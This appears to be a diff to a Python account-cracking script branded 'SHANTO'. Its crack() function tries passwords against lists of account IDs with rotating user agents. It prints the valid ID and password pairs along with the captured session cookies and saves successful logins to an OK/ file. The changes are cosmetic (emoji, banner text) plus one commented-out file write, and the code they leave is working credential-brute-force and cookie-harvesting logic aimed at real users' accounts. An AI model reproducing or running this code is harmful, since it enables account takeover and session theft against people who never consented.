@@ -474,7 +474,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{bo}[ðŸSHANTOðŸ] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}â€¢{P}[{h}Ok{P}â€¢{bo}{ok}{P}] "),
+	sys.stdout.write(f"\r{bo}[🤍SHANTO🤍] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}🤍{P}[{h}Ok{P}🤍{bo}{ok}{P}] "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -494,7 +494,7 @@ def crack(idf,pwv):
 				#SHANTO-King
 				print(f'\r\033[0;94m[{time.strftime("%H:%M")}â€¢SHANTO-Cp] {idf} â€¢ {pw}\n\033[0;93[ðŸ¤Ÿ]= COOKIESâ€¢ \033[0;92m{kuki} ')     
 				os.system('espeak -a 300 " C,  P"')
-			    open('CP/'+cpc,'a').write(idf+' | '+pw+'\n')
+			    #open('CP/'+cpc,'a').write(idf+' | '+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
@@ -503,7 +503,7 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				#SHANTO-King
-				print(f'\r\033[0;92m[SHANTO-âž¼-OKðŸŒº] {idf} â€¢ {pw}\n\033[0;93m[ðŸ”¥]= COOKIES â€¢ \033[0;92m{kuki} ')
+				print(f'\r\033[0;92m[SHANTO-🤍-OK] {idf} 🤍 {pw}\n\033[0;93m[🤍]= COOKIES 🤍 \033[0;92m{kuki} ')
 				print('\033[0;94m===============================================')
 				os.system('espeak -a 300 " SHANTO,  Ok,  id"')
 				open('OK/'+okc,'a').write(idf+' â€¢ '+pw+'\n')
